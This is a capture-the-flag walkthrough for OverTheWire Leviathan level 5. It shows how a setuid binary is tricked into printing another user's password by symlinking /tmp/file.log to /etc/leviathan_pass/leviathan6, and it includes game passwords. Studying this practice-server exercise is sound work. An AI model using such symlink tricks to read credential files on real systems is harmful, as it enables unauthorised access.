# Leviathan 5


## Overview

-----------------
On the OverTheWire/Leviathan website, we are told how connecting to the bandit server as a specific user works.

Each user corresponds to a different level:
- Leviathan0 -> Level 0
- Leviathan1 -> Level 1
- ...
- Leviathan33 -> Level 33

Each level is hiding a flag, which is used as the password for the following level. Meaning, one must solve `Level n` to play `Level n+1`.

We always start out connecting to the `leviathan.labs.overthewire.org` server on `port 2223` for each level.
Again, the users on the server specifies the level. Each starting point is the same:

``` text
➜  ~  ssh leviathan0@leviathan.labs.overthewire.org -p 2223          
                   _            _       _   _                        
                  | | _____   _(_) __ _| |_| |__   __ _ _ __         
                  | |/ _ \ \ / / |/ _` | __| '_ \ / _` | '_ \        
                  | |  __/\ V /| | (_| | |_| | | | (_| | | | |       
                  |_|\___| \_/ |_|\__,_|\__|_| |_|\__,_|_| |_|       
                                                                     
                                                                     
                      This is an OverTheWire game server.            
            More information on http://www.overthewire.org/wargames  
                                                                     
leviathan0@leviathan.labs.overthewire.org's password:     
```

The password will always be the flag of the previous level. With the exception of Level 0, where the password is `leviathan0`.


## Connecting

--------------

We can establish a connection with the server via ssh, and using the password `EKKlTF1Xqs`:

``` text
➜  ~  ssh leviathan5@leviathan.labs.overthewire.org -p 2223
                   _            _       _   _                 
                  | | _____   _(_) __ _| |_| |__   __ _ _ __  
                  | |/ _ \ \ / / |/ _` | __| '_ \ / _` | '_ \ 
                  | |  __/\ V /| | (_| | |_| | | | (_| | | | |
                  |_|\___| \_/ |_|\__,_|\__|_| |_|\__,_|_| |_|
                                                              

                      This is an OverTheWire game server. 
            More information on http://www.overthewire.org/wargames

leviathan5@leviathan.labs.overthewire.org's password: EKKlTF1Xqs

      ,----..            ,----,          .---.
     /   /   \         ,/   .`|         /. ./|
    /   .     :      ,`   .'  :     .--'.  ' ;
   .   /   ;.  \   ;    ;     /    /__./ \ : |
  .   ;   /  ` ; .'___,/    ,' .--'.  '   \' .
  ;   |  ; \ ; | |    :     | /___/ \ |    ' '
  |   :  | ; | ' ;    |.';  ; ;   \  \;      :
  .   |  ' ' ' : `----'  |  |  \   ;  `      |
  '   ;  \; /  |     '   :  ;   .   \    .\  ;
   \   \  ',  /      |   |  '    \   \   ' \ |
    ;   :    /       '   :  |     :   '  |--"
     \   \ .'        ;   |.'       \   \ ;
  www. `---` ver     '---' he       '---" ire.org


Welcome to OverTheWire!

<snip>

  Enjoy your stay!

leviathan5@gibson:~$ 
```

## Looking Around

--------------
We first start by looking around the home directory, as we have no idea what is going on. We will use the command `ls`,
which allows us to `list` the content of the current directory (or specified directory).


``` text
leviathan5@gibson:~$ ls
leviathan5
```


``` text
leviathan5@gibson:~$ ./leviathan5 
Cannot find /tmp/file.log
leviathan5@gibson:~$ echo "something" > /tmp/file.log
leviathan5@gibson:~$ ./leviathan5 
something
leviathan5@gibson:~$
```

Alright. So, looking at what happens when we pass a file, apparently we read the contents of the file and then print them 
out. This makes me believe we can use a `symbolic link` to the `/etc/leviathan_pass/leviathan6` file to print the contents
of that file. Let's first check who the owner of `./leviathan5` file is.

``` text
leviathan5@gibson:~$ ls -l ./leviathan5 
-r-sr-x--- 1 leviathan6 leviathan5 15132 Apr 23 18:04 ./leviathan5
```

Alright. As believed, `leviathan6` owns the file. This means, the file has access to other files who's owner is `leviathan6`.
Or rather, it has access to files where `leviathan6` has access to. Let's first check that the file doesn't just get deleted
at the end like in some other previous levels.

``` text
leviathan5@gibson:~$ touch /tmp/file.log
leviathan5@gibson:~$ ltrace ./leviathan5 
__libc_start_main(0x8049206, 1, 0xffffd5f4, 0 <unfinished ...>
fopen("/tmp/file.log", "r")                                                             = 0x804d1a0
fgetc(0x804d1a0)                                                                        = '\377'
feof(0x804d1a0)                                                                         = 1
fclose(0x804d1a0)                                                                       = 0
getuid()                                                                                = 12005
setuid(12005)                                                                           = 0
unlink("/tmp/file.log")                                                                 = 0
+++ exited (status 0) +++
leviathan5@gibson:~$
```

Oh, actually, it does get deleted at the end via the `unlink()` system call. Good thing we caught that.

So `symbolic link` is the way to go.


``` text
leviathan5@gibson:~$ ln -s /etc/leviathan_pass/leviathan6 /tmp/file.log
leviathan5@gibson:~$ ./leviathan5 
YZ55XPVk2l
```

BOOM We got another flag. 

